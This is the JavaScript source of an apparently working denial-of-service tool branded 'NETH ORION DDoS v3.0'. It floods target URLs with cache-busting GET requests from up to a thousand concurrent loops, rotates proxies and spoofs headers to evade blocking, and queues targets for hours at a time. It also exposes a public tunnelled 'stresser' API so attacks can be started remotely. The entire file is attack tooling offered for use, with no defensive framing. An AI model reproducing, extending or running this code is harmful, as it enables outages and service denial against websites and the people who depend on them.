const express = require("express");
const fs = require("fs");
const path = require("path");
const https = require("https");
const { randomUserAgent } = require("random-headers");
const { SocksProxyAgent } = require("socks-proxy-agent");
const { request: urequest, ProxyAgent } = require("undici");
const readline = require("readline");
require("dotenv").config();

const nport = require("./nport.js");

const app = express();
app.use(express.json());

const stateFilePath = path.join(__dirname, "attackState.json");
const REQUESTS_PER_THREAD = parseInt(process.env.PER_THREAD, 10) || 10;
const numThreads = parseInt(process.env.MAX_THREADS, 10) || 1000;
const MAX_QUEUE = parseInt(process.env.MAX_QUEUE, 10) || 3;
const CONNECTION_TIMEOUT = parseInt(process.env.TIMEOUT, 10) || 5000;
let totalRequestsSent = 0;
let nportUrl = null;
let tunnelActive = false;
let activeThreads = [];
let targetQueue = [];

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
});

const colors = {
  red: (t) => `\x1b[31m${t}\x1b[0m`,
  green: (t) => `\x1b[32m${t}\x1b[0m`,
  yellow: (t) => `\x1b[33m${t}\x1b[0m`,
  cyan: (t) => `\x1b[36m${t}\x1b[0m`,
  magenta: (t) => `\x1b[35m${t}\x1b[0m`,
  gray: (t) => `\x1b[90m${t}\x1b[0m`,
  bold: (t) => `\x1b[1m${t}\x1b[0m`,
};

const generateCacheBuster = () => `${Date.now()}_${Math.random().toString(36).slice(2, 6)}`;

const getNoCacheHeaders = () => ({
  "Cache-Control": "no-cache, no-store, max-age=0",
  Pragma: "no-cache",
  "User-Agent": randomUserAgent(),
  "X-Forwarded-For": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
});

function ensureStateFileExists() {
  if (!fs.existsSync(stateFilePath)) {
    fs.writeFileSync(
      stateFilePath,
      JSON.stringify({ continueAttack: false, currentTarget: null, totalRequests: 0, queue: [] })
    );
  }
}

function loadState() {
  ensureStateFileExists();
  try {
    const data = fs.readFileSync(stateFilePath, "utf-8");
    return JSON.parse(data);
  } catch {
    return { continueAttack: false, currentTarget: null, totalRequests: 0, queue: [] };
  }
}

let state = loadState();
let continueAttack = state.continueAttack;
let currentTarget = state.currentTarget;
totalRequestsSent = state.totalRequests || 0;
targetQueue = state.queue || [];

if (currentTarget) {
  const endTime = currentTarget.startTime + currentTarget.duration;
  if (Date.now() > endTime) {
    console.log(colors.yellow(`Target expired: ${currentTarget.url}`));
    currentTarget = null;
  }
}

if (!currentTarget && targetQueue.length > 0) {
  currentTarget = targetQueue.shift();
  console.log(colors.green(`Starting next target from queue: ${currentTarget.url}`));
  totalRequestsSent = 0;
}

if (currentTarget === null) {
  continueAttack = false;
  totalRequestsSent = 0;
}

state = { continueAttack, currentTarget, totalRequests: totalRequestsSent, queue: targetQueue };
fs.writeFileSync(stateFilePath, JSON.stringify(state));

const proxyFilePath = path.join(__dirname, "proxy.txt");
const getRandomElement = (arr) => arr[Math.floor(Math.random() * arr.length)];

function loadProxies() {
  try {
    return fs
      .readFileSync(proxyFilePath, "utf-8")
      .split("\n")
      .map((l) => l.trim())
      .filter(Boolean);
  } catch {
    return [];
  }
}

const formatNumber = (num) => num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");

// Debounced state file writer – never blocks the event loop
let saveTimer = null;
function debouncedSave() {
  if (saveTimer) return;
  saveTimer = setTimeout(() => {
    state.totalRequests = totalRequestsSent;
    fs.writeFile(stateFilePath, JSON.stringify(state), () => {});
    saveTimer = null;
  }, 500);
}

function saveNow() {
  if (saveTimer) {
    clearTimeout(saveTimer);
    saveTimer = null;
  }
  state.totalRequests = totalRequestsSent;
  fs.writeFileSync(stateFilePath, JSON.stringify(state));
}

function resetTotal() {
  totalRequestsSent = 0;
  state.totalRequests = 0;
  fs.writeFileSync(stateFilePath, JSON.stringify(state));
  console.log(colors.green("Total reset to 0"));
}

// SOCKS fallback request (kept for compatibility, avoids axios)
function socksRequest(url, agent) {
  return new Promise((resolve) => {
    const req = https.request(
      url,
      {
        agent,
        method: "GET",
        headers: getNoCacheHeaders(),
        timeout: CONNECTION_TIMEOUT,
        rejectUnauthorized: false,
      },
      (res) => {
        res.resume();
        resolve({ status: res.statusCode });
      }
    );
    req.on("error", () => resolve(null));
    req.on("timeout", () => {
      req.destroy();
      resolve(null);
    });
    req.end();
  });
}

function createContext(proxyLine) {
  if (!proxyLine) return { type: "direct" };
  const parts = proxyLine.split(":");
  if (parts[0].includes("socks")) {
    const host = parts[0].replace("socks5://", "").replace("socks4://", "");
    return { type: "socks", agent: new SocksProxyAgent(`socks5://${host}:${parts[1]}`) };
  }
  return { type: "http", dispatcher: new ProxyAgent(`http://${proxyLine}`) };
}

const performAttack = async (target, ctx, threadId) => {
  if (!continueAttack || !target) return;

  const endTime = target.startTime + target.duration;
  if (Date.now() > endTime) {
    console.log(colors.yellow(`Target completed: ${target.url}`));

    if (targetQueue.length > 0) {
      currentTarget = targetQueue.shift();
      console.log(colors.green(`Starting next target from queue: ${currentTarget.url}`));
      resetTotal();
      state = { continueAttack, currentTarget, totalRequests: totalRequestsSent, queue: targetQueue };
      saveNow();
    } else {
      continueAttack = false;
      currentTarget = null;
      resetTotal();
      state = { continueAttack: false, currentTarget: null, totalRequests: 0, queue: [] };
      saveNow();
      console.log(colors.yellow("All targets completed. Attack finished."));
    }
    return;
  }

  const startTime = Date.now();
  const promises = [];

  for (let i = 0; i < REQUESTS_PER_THREAD; i++) {
    const cb = generateCacheBuster();
    const sep = target.url.includes("?") ? "&" : "?";
    const url = `${target.url}${sep}_=${cb}&nocache=${cb}&cb=${Date.now()}`;
    const headers = getNoCacheHeaders();

    if (ctx.type === "socks") {
      promises.push(socksRequest(url, ctx.agent));
    } else {
      promises.push(
        urequest(url, {
          dispatcher: ctx.type === "direct" ? undefined : ctx.dispatcher,
          method: "GET",
          headers,
          signal: AbortSignal.timeout(CONNECTION_TIMEOUT),
        })
          .then(async (res) => {
            await res.body.dump();
            return { status: res.statusCode };
          })
          .catch(() => null)
      );
    }
  }

  let successfulRequests = 0;
  try {
    const results = await Promise.allSettled(promises);
    for (const r of results) {
      if (r.status === "fulfilled" && r.value && r.value.status) {
        successfulRequests++;
        const s = r.value.status;
        if (s === 403) console.log(colors.yellow(`[T${threadId}] 403 Forbidden on ${target.url}`));
        else if (s === 404) console.log(colors.gray(`[T${threadId}] 404 on ${target.url}`));
        else if (s === 503) console.log(colors.magenta(`[T${threadId}] 503 Overloaded on ${target.url}`));
        else if (s === 502 || s === 429) console.log(colors.yellow(`[T${threadId}] ${s} on ${target.url}`));
      }
    }
  } catch {}

  totalRequestsSent += successfulRequests;
  debouncedSave();

  const duration = Date.now() - startTime;
  if (threadId === 0 && duration > 0) {
    const rps = (successfulRequests / (duration / 1000)).toFixed(1);
    const queueLeft = targetQueue.length;
    console.log(
      `${colors.green(">")} ${colors.gray(`[${new Date().toLocaleTimeString()}]`)} ${colors.red(`${formatNumber(successfulRequests)} req`)} | ${colors.cyan(`Total: ${formatNumber(totalRequestsSent)}`)} | ${colors.green(`RPS: ${rps}`)} | ${colors.magenta(`Queue: ${queueLeft}/${MAX_QUEUE}`)}`
    );
  }

  if (continueAttack) {
    setTimeout(() => performAttack(target, ctx, threadId), 0);
  }
};

const resumeAttack = async () => {
  if (!continueAttack || !currentTarget) return;

  console.log(colors.yellow(`Resuming attack on: ${currentTarget.url}`));
  console.log(colors.cyan(`Queue length: ${targetQueue.length}/${MAX_QUEUE}`));

  const proxies = loadProxies();
  activeThreads = [];

  if (!proxies.length) {
    console.log(colors.yellow("No proxies found — using direct connections"));
    const ctx = { type: "direct" };
    for (let i = 0; i < numThreads; i++) {
      if (!continueAttack) break;
      performAttack(currentTarget, ctx, i);
      activeThreads.push(i);
    }
    console.log(colors.green(`Resumed with ${activeThreads.length} threads (direct)`));
    return;
  }

  for (let i = 0; i < numThreads; i++) {
    if (!continueAttack) break;
    const ctx = createContext(getRandomElement(proxies));
    performAttack(currentTarget, ctx, i);
    activeThreads.push(i);
  }
  console.log(colors.green(`Resumed with ${activeThreads.length} threads (proxied)`));
};

const autoStartTunnel = async () => {
  const tunnelSubdomain = process.env.NPORT || "ddos";
  console.log(colors.cyan(`Starting tunnel: ${tunnelSubdomain}`));
  try {
    const url = await nport.start(25694, tunnelSubdomain, { disableSuffix: false });
    if (url) {
      nportUrl = url;
      tunnelActive = true;
      console.log(colors.green(`Tunnel active: ${nportUrl}`));
      return true;
    }
    console.log(colors.red("Tunnel failed"));
    return false;
  } catch (err) {
    console.log(colors.red(`Tunnel error: ${err.message}`));
    return false;
  }
};

const addToQueue = async (url, durationHours) => {
  if (!url || !/^https?:\/\//.test(url)) {
    console.log(colors.red("Invalid URL"));
    return false;
  }
  if (targetQueue.length >= MAX_QUEUE) {
    console.log(colors.red(`Queue is full. Max queue size: ${MAX_QUEUE}`));
    return false;
  }
  const newTarget = { url, startTime: Date.now(), duration: durationHours * 60 * 60 * 1000 };
  targetQueue.push(newTarget);
  state = { continueAttack, currentTarget, totalRequests: totalRequestsSent, queue: targetQueue };
  saveNow();
  console.log(colors.green(`Added to queue: ${url} for ${durationHours}h (${targetQueue.length}/${MAX_QUEUE})`));
  return true;
};

const startAttack = async (url, durationHours) => {
  if (!url || !/^https?:\/\//.test(url)) {
    console.log(colors.red("Invalid URL"));
    return false;
  }
  if (continueAttack) {
    console.log(colors.yellow("Attack already running, adding to queue instead"));
    return await addToQueue(url, durationHours);
  }

  const proxies = loadProxies();
  resetTotal();
  targetQueue = [];

  currentTarget = { url, startTime: Date.now(), duration: durationHours * 60 * 60 * 1000 };
  continueAttack = true;
  state = { continueAttack, currentTarget, totalRequests: 0, queue: [] };
  saveNow();

  const mode = proxies.length ? "proxied" : "direct";
  console.log(colors.green(`\nAttack Started: ${url} for ${durationHours}h`));
  console.log(colors.cyan(`Threads: ${numThreads} | Req/thread: ${REQUESTS_PER_THREAD} | Mode: ${mode}`));
  console.log(colors.magenta(`Queue size: ${MAX_QUEUE}`));
  if (tunnelActive && nportUrl) console.log(colors.magenta(`Public: ${nportUrl}`));
  console.log("");

  activeThreads = [];
  if (!proxies.length) {
    const ctx = { type: "direct" };
    for (let i = 0; i < numThreads; i++) {
      if (!continueAttack) break;
      performAttack(currentTarget, ctx, i);
      activeThreads.push(i);
    }
  } else {
    for (let i = 0; i < numThreads; i++) {
      if (!continueAttack) break;
      const ctx = createContext(getRandomElement(proxies));
      performAttack(currentTarget, ctx, i);
      activeThreads.push(i);
    }
  }
  return true;
};

const stopAttack = async () => {
  if (!continueAttack) {
    console.log(colors.yellow("No active attack"));
    return;
  }
  continueAttack = false;
  activeThreads = [];
  currentTarget = null;
  targetQueue = [];
  resetTotal();
  state = { continueAttack: false, currentTarget: null, totalRequests: 0, queue: [] };
  saveNow();
  console.log(colors.yellow("\nAttack Stopped"));
  console.log(colors.green("Queue cleared. Total reset to 0\n"));
};

const showStatus = () => {
  if (!continueAttack || !currentTarget) {
    console.log(colors.yellow("No active attack"));
    return;
  }
  const remaining = ((currentTarget.startTime + currentTarget.duration - Date.now()) / (60 * 60 * 1000)).toFixed(2);
  console.log(colors.cyan("\n=== ATTACK STATUS ==="));
  console.log(`${colors.yellow("Current Target:")} ${currentTarget.url}`);
  console.log(`${colors.gray(`Remaining: ${remaining}h`)}`);
  console.log(`${colors.green("Requests Sent:")} ${formatNumber(totalRequestsSent)}`);
  console.log(`${colors.cyan("Active Threads:")} ${activeThreads.length}`);
  console.log(`${colors.magenta("Queue:")} ${targetQueue.length}/${MAX_QUEUE}`);
  if (targetQueue.length > 0) {
    console.log(`${colors.yellow("\nQueued Targets:")}`);
    targetQueue.forEach((t, idx) => {
      const qr = ((t.startTime + t.duration - Date.now()) / (60 * 60 * 1000)).toFixed(2);
      console.log(`  ${idx + 1}. ${t.url} (${qr}h)`);
    });
  }
  if (tunnelActive && nportUrl) console.log(`${colors.magenta("\nPublic URL:")} ${nportUrl}`);
  console.log("");
};

const showHelp = () => {
  console.log(colors.cyan("\n=== NETH ORION DDoS COMMANDS ==="));
  console.log(`${colors.green("start <url> [hours]")}        - Start attack`);
  console.log(`${colors.green("add <url> [hours]")}          - Add to queue (max: ${MAX_QUEUE})`);
  console.log(`${colors.green("stop")}                       - Stop attack`);
  console.log(`${colors.green("status")}                     - Show status`);
  console.log(`${colors.green("queue")}                      - Show queue only`);
  console.log(`${colors.green("clear")}                      - Clear console`);
  console.log(`${colors.green("help")}                       - This help`);
  console.log(`${colors.green("exit")}                       - Exit\n`);
  console.log(colors.gray(`Queue size: ${MAX_QUEUE} | Threads: ${numThreads} | Timeout: ${CONNECTION_TIMEOUT}ms`));
};

const showQueue = () => {
  if (targetQueue.length === 0) {
    console.log(colors.yellow("\nQueue is empty"));
  } else {
    console.log(colors.cyan("\n=== QUEUE ==="));
    targetQueue.forEach((t, idx) => {
      const r = ((t.startTime + t.duration - Date.now()) / (60 * 60 * 1000)).toFixed(2);
      console.log(`${idx + 1}. ${t.url} (${r}h left in queue)`);
    });
  }
  console.log(`\n${colors.magenta(`${targetQueue.length}/${MAX_QUEUE} slots used`)}`);
};

const clearConsole = () => {
  console.clear();
  console.log(colors.green("NETH ORION DDoS v3.0"));
  console.log(colors.gray(`Queue System | Max: ${MAX_QUEUE} | Threads: ${numThreads}`));
  console.log(colors.gray('Type "help" for commands\n'));
};

const handleCommand = async (cmd) => {
  const parts = cmd.trim().split(/\s+/);
  const command = parts[0].toLowerCase();
  const args = parts.slice(1);

  switch (command) {
    case "start":
      if (args.length < 1) {
        console.log(colors.red("Usage: start <url> [hours]"));
        return;
      }
      await startAttack(args[0], args[1] ? parseFloat(args[1]) : 1);
      break;
    case "add":
      if (args.length < 1) {
        console.log(colors.red("Usage: add <url> [hours]"));
        return;
      }
      await addToQueue(args[0], args[1] ? parseFloat(args[1]) : 1);
      break;
    case "queue":
      showQueue();
      break;
    case "stop":
      await stopAttack();
      break;
    case "status":
      showStatus();
      break;
    case "clear":
      clearConsole();
      break;
    case "help":
      showHelp();
      break;
    case "exit":
      console.log(colors.yellow("Goodbye!"));
      rl.close();
      process.exit(0);
      break;
    default:
      if (command) console.log(colors.red(`Unknown: ${command}`));
      showHelp();
  }
};

app.get("/stresser", async (req, res) => {
  const url = req.query.url;
  const duration = parseFloat(req.query.duration) || 1;
  if (!url || !/^https?:\/\//.test(url)) return res.status(400).json({ error: "Invalid URL" });
  await startAttack(url, duration);
  res.json({ success: true, message: `Attack started on ${url}`, queueSize: MAX_QUEUE });
});

app.get("/add", async (req, res) => {
  const url = req.query.url;
  const duration = parseFloat(req.query.duration) || 1;
  if (!url || !/^https?:\/\//.test(url)) return res.status(400).json({ error: "Invalid URL" });
  const success = await addToQueue(url, duration);
  res.json({ success, queueSize: MAX_QUEUE, currentQueue: targetQueue.length, queue: targetQueue.map((t) => t.url) });
});

app.get("/stop", async (req, res) => {
  await stopAttack();
  res.json({ success: true, totalRequests: totalRequestsSent });
});

app.get("/status", (req, res) => {
  res.json({
    active: continueAttack,
    currentTarget: currentTarget ? currentTarget.url : null,
    totalRequests: totalRequestsSent,
    threads: activeThreads.length,
    queueSize: MAX_QUEUE,
    queue: targetQueue.map((t) => t.url),
    queueCount: targetQueue.length,
  });
});

app.get("/queue", (req, res) => {
  res.json({
    maxQueue: MAX_QUEUE,
    currentQueue: targetQueue.length,
    queue: targetQueue.map((t) => ({ url: t.url, duration: t.duration / 3600000 })),
  });
});

const port = process.env.PORT || 25694;

(async () => {
  await autoStartTunnel();
  app.listen(port, () => {
    console.clear();
    console.log(colors.green(`\nNETH ORION DDoS v3.0`));
    console.log(colors.cyan(`Local API: http://localhost:${port}`));
    console.log(colors.magenta(`Queue Size: ${MAX_QUEUE} | Threads: ${numThreads}`));
    if (tunnelActive && nportUrl) console.log(colors.magenta(`Public API: ${nportUrl}`));
    console.log(colors.green('\nType "help" for commands\n'));

    resumeAttack();

    rl.setPrompt(colors.red("neth-orion> "));
    rl.prompt();
    rl.on("line", async (input) => {
      await handleCommand(input);
      rl.prompt();
    });
  });
})();
